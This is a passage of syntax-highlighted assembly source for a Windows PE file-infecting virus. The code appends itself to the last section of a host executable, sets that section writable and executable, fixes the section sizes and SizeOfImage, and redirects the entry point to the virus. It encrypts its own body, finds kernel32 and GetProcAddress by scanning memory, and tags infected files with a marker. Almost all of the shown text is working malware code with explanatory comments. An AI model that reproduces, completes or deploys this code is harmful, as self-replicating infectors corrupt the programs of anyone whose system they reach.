                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">X_Sections</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; number of sections</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; calculate last one</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; We've got the last section in the section table just</span><span class="sc0">
                </span><span class="sc1">;in esi ( while PE header is still in edx )</span><span class="sc0">
                </span><span class="sc1">; So first we set it to writable, code and executable</span><span class="sc0">
                </span><span class="sc1">;( also, we discard it if it contains useless data, as</span><span class="sc0">
                </span><span class="sc1">;.reloc has )</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0A0000020h</span><span class="sc0">

                </span><span class="sc1">; Now we save SizeOfRawData, add our size to the Virtual</span><span class="sc0">
                </span><span class="sc1">;size, to put the real size of the section now.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
                </span><span class="sc6">xadd</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VirtualSize</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">

                </span><span class="sc1">; As eax holds the new virtual size, we have probably</span><span class="sc0">
                </span><span class="sc1">;fucked the alignment. So we get it and divide the new</span><span class="sc0">
                </span><span class="sc1">;VirtualSize by the alignment: the result of the new</span><span class="sc0">
                </span><span class="sc1">;SizeOfRawData is just the quotient multiplied by the</span><span class="sc0">
                </span><span class="sc1">;Alignment</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; eax holds virtual size</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; file align x number of bunchs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">; Now the NewSizeOfRawData is calculated and stored. So</span><span class="sc0">
                </span><span class="sc1">;what's now ? We add that place the VirtualAddress stored</span><span class="sc0">
                </span><span class="sc1">;in offset 0ch... and so we get the new entry point for</span><span class="sc0">
                </span><span class="sc1">;the virus: that VirtualAddress ( where it's loaded in</span><span class="sc0">
                </span><span class="sc1">;memory ) plus the offset where the virus is at, makes</span><span class="sc0">
                </span><span class="sc1">;our entry point.</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; This is VirtualSize - virus_size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; section RVA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">028h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Old entry point</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dif_point2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">no_ep_mod</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dif_point2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">; Then, we calculate how much more data we have...</span><span class="sc0">
                </span><span class="sc1">;and so we store it in SizeOfImage ( of course, it's</span><span class="sc0">
                </span><span class="sc1">;this rounded one as it have to be aligned...</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; add to SizeOfImage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">04ch</span><span class="sc4">],</span><span class="sc12">'CHR0'</span><span class="sc0">

                </span><span class="sc1">; EAX = OLD EP</span><span class="sc0">
                </span><span class="sc1">; EBX = NEW EP</span><span class="sc0">


                </span><span class="sc1">; Now to finish infection, the whole virus is copied</span><span class="sc0">
                </span><span class="sc1">;to the file.</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">v_start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infection_cryption</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0bff70000h</span><span class="sc0">

</span><span class="sc1">; Close and go</span><span class="sc0">

</span><span class="sc5">unmap_close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Unmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Close_handles</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Close</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,-</span><span class="sc2">0bff70000h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Cool_infected</span><span class="sc0">

                </span><span class="sc1">; If we had any problems, we have to set the old</span><span class="sc0">
                </span><span class="sc1">;file length so it doesn't grow</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; File handle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Find_Win32_Data</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Pointer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_SetEnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">Cool_infected</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Close</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">API_Reference</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d</span><span class="sc4">,</span><span class="sc2">12d</span><span class="sc4">,</span><span class="sc2">12d</span><span class="sc4">,</span><span class="sc2">15d</span><span class="sc4">,</span><span class="sc2">14d</span><span class="sc4">,</span><span class="sc2">19d</span><span class="sc4">,</span><span class="sc2">14d</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc4">,</span><span class="sc2">15d</span><span class="sc4">,</span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc2">11d</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc4">,</span><span class="sc2">21d</span><span class="sc0">

</span><span class="sc5">End_Reference</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">API_Quantity</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">End_Reference</span><span class="sc4">-</span><span class="sc5">API_Reference</span><span class="sc0">

</span><span class="sc1">;   API names</span><span class="sc0">

</span><span class="sc5">API_Names</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ExitThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   GETTING GETMODULEHANDLE AND GETPROCADDRESS</span><span class="sc0">

</span><span class="sc1">; Here we look at the GetModuleHandle and GetProcAddress addreses in</span><span class="sc0">
</span><span class="sc1">;memory so that we can use all the APIs in the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetModuleHandleProcAddress</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; This method on getting the Kernel32.dll address was suggested by Billy</span><span class="sc0">
    </span><span class="sc1">;Belcebu so I must give him some greetings ;). As a program is</span><span class="sc0">
    </span><span class="sc1">;consecuence of a CreateProcess call, place in kernel from where it</span><span class="sc0">
    </span><span class="sc1">;was called is still in the stack; so we substract from it again and</span><span class="sc0">
    </span><span class="sc1">;again till we find the real header.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">02Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">CheckAgain</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CheckAgain</span><span class="sc0">

    </span><span class="sc1">; So we've got the kernel just right here.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AddressOfNames</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; + base address of K32</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">Find_GPA</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">                               </span><span class="sc1">; Pointer to name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Name in edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'PteG'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Find_GPA</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">5h</span><span class="sc4">],</span><span class="sc12">'dAco'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Find_GPA</span><span class="sc0">
</span><span class="sc5">ProcFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; ecx handles where we found it.</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Address of ordinals</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                               </span><span class="sc1">; EAX = ordinal numbah</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">01ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">                      </span><span class="sc1">; *4h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; Adjust to base</span><span class="sc0">
                                                    </span><span class="sc1">; Absolute address here</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GPAddress</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc4">)+</span><span class="sc2">401004h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">GPAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set addr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetMHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set Base</span><span class="sc0">

                </span><span class="sc1">; So we stored GetProcAddress place</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;GPName:         db 'GetProcAddress'</span><span class="sc0">


</span><span class="sc5">returnway</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;   Internal text</span><span class="sc0">


</span><span class="sc5">image_base</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;   Structures</span><span class="sc0">

</span><span class="sc5">Find_Win32_Data</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">EncEnd</span><span class="sc0">          </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">EncLength</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">EncEnd</span><span class="sc4">-</span><span class="sc5">EncStart</span><span class="sc0">

</span><span class="sc1">;/*************************************************************************/</span><span class="sc0">
</span><span class="sc1">;   Here is where virus decryption is perfomed after the 1st generation.</span><span class="sc0">
</span><span class="sc1">;/*************************************************************************/</span><span class="sc0">

</span><span class="sc5">ReturnHost</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">seg</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
